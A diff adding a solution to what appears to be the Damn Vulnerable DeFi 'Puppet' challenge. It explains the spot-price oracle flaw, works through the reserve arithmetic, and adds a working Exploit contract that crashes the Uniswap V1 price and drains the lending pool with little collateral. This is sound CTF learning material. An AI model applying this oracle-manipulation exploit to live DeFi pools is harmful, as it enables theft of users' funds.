@@ -89,10 +89,26 @@ contract PuppetChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * The core vulnerability lies in the PuppetPool’s reliance on the Uniswap pair’s spot price as an oracle, calculated by _computeOraclePrice().
+     * This price is simply: price = (ETH balance in pair) / (token balance in pair)
+     *
+     * The Uniswap pair’s reserves can be manipulated by anyone trading with it.
+     * Selling a large amount of tokens increases the token reserve and decreases the ETH reserve, crashing the token’s price.
+     * Since calculateDepositRequired uses this price, a lower price reduces the ETH needed to borrow tokens, allowing an attacker to borrow large amounts with minimal collateral.
+     * Initially:
+     *
+     * Uniswap reserves: 10 ETH, 10 tokens.
+     * Price: 10e18 / 10e18 = 1e18 wei/token (1 ETH/token).
+     * Deposit for 100,000 tokens: 2 * 100,000 * 1 = 200,000 ETH.
+     * The player only has 25 ETH, making direct borrowing impossible. However, by manipulating the Uniswap reserves, the price can be lowered, reducing the deposit requirement.
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // Player sends 25 ETH to the contract
+        Exploit exploit =
+            new Exploit{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange, recovery);
+        // Sends 1,000 tokens to exploit
+        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
+        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +131,71 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Exploit {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    address recovery;
+
+    constructor(
+        DamnValuableToken _token,
+        PuppetPool _lendingPool,
+        IUniswapV1Exchange _uniswapV1Exchange,
+        address _recovery
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        recovery = _recovery;
+    }
+
+    function attack(uint256 exploitAmount) public {
+        // current balance of DamnValuableToken
+        uint256 tokenBalance = token.balanceOf(address(this));
+        // Approves Uniswap to spend 1,000 tokens.
+        token.approve(address(uniswapV1Exchange), tokenBalance);
+
+        uniswapV1Exchange.tokenToEthTransferInput( // This is a Uniswap V1 function to swap tokens for ETH
+            tokenBalance, // sells all the tokens it holds
+            1, // This sets a minimum amount of ETH to receive, but it's set very low (1 wei) so the transaction doesn't revert due to slippage.
+            block.timestamp, // deadline for the transaction
+            address(this) // recipient. The ETH received from the swap is sent back to the exploit contract
+        );
+
+        // Sends 20 ETH to the lending pool as collateral to borrow 100,000 tokens
+        lendingPool.borrow{value: 20e18}(exploitAmount, recovery);
+    }
+
+    /**
+     * Price Manipulation Calculation
+     * Before Sale:
+     * Uniswap: 10 ETH, 10 tokens.
+     * Price: 10e18 / 10e18 = 1e18 wei/token.
+     *
+     * Selling 1,000 Tokens:
+     * Uniswap V1 fee: 0.3%, so 1000 * 0.997 = 997 tokens added to reserves.
+     *
+     * Constant product:
+     * (token_reserve + tokens_sold * 0.997) * (eth_reserve - eth_received) = 10 * 10.
+     * (10 + 997) * (10 - eth_received) = 100.
+     * 1007 * (10 - eth_received) = 100.
+     * 10 - eth_received = 100 / 1007 ≈ 0.0993.
+     * eth_received ≈ 9.9007 ETH.
+     *
+     * New reserves: 1,007 tokens, ≈0.0993 ETH.
+     *
+     * New Price:
+     * 0.0993e18 / 1007e18 ≈ 9.86e-5 ETH/token (9.86e13 wei/token).
+     *
+     * New Deposit Requirement:
+     * For 100,000 tokens: 2 * 100,000 * 9.86e-5 ≈ 19.72 ETH.
+     *
+     * The exploit uses 20 ETH, slightly more than needed, which works.
+     *
+     * Outcome
+     * The contract sells 1,000 tokens, receives ~9.9 ETH, and uses 20 of its 25 ETH to borrow 100,000 tokens, draining the pool. Tokens go to recovery.
+     */
+    receive() external payable {}
 }
